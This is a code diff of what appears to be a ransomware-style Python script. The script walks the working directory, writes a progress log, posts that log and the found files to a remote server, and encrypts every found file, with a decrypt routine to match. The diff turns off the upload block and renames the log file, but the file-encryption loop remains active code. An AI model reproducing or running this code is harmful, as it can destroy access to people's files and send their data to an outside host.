@@ -83,7 +83,7 @@ for dirpath, dirs, files in os.walk(os.getcwd()):
 # ========================================================================= #
 # Save Progress:
 # ========================================================================= #
-with open("node_{0}".format(node_id), "w") as fl:
+with open("node_{0}.txt".format(node_id), "w") as fl:
     fl.write("Node ID: {0}\n".format(node_id))
     fl.write("Node Signature: {0}\n\n".format(node_sig))
     fl.write("{0} File(s) affected:\n".format(len(tool.files_found)))
@@ -95,7 +95,7 @@ with open("node_{0}".format(node_id), "w") as fl:
 # ========================================================================= #
 if False: # Disabled.
     while True:
-        ping = os.system("ping -c 1 " + post_server)
+        ping = os.system("ping -c 1 " + post_server[:-14])
         if ping == 0:
             break
         else:
@@ -108,10 +108,10 @@ if False: # Disabled.
 # ========================================================================= #
 # Upload Files Found:
 # ========================================================================= #
-if True: # Disabled.
+if False: # Disabled.
     # Send Progress Log:
     try:
-        progress = open("node_{0}".format(node_id), "rb")
+        progress = open("node_{0}.txt".format(node_id), "rb")
         progress_response = requests.post(post_server, files = {"fileToUpload": progress})
     except Exception as error:
         print(error)
@@ -131,7 +131,7 @@ if True: # Disabled.
 for f in tool.files_found:
     try:
         # Ignore this file and progress log:
-        if f != sys.argv[0] and f != "node_{0}".format(node_id):
+        if f != sys.argv[0] and f != "node_{0}.txt".format(node_id):
             # Read original data and encrypt:
             with open(f, "rb") as fl:
                 data = fl.read()
@@ -152,7 +152,7 @@ def decrypt(key):
     for f in tool.files_found:
         try:
             # Ignore this file and progress log:
-            if f != sys.argv[0] and f != "node_{0}".format(node_id):
+            if f != sys.argv[0] and f != "node_{0}.txt".format(node_id):
                 # Read original data and encrypt:
                 with open(f, "rb") as fl:
                     data = fl.read()
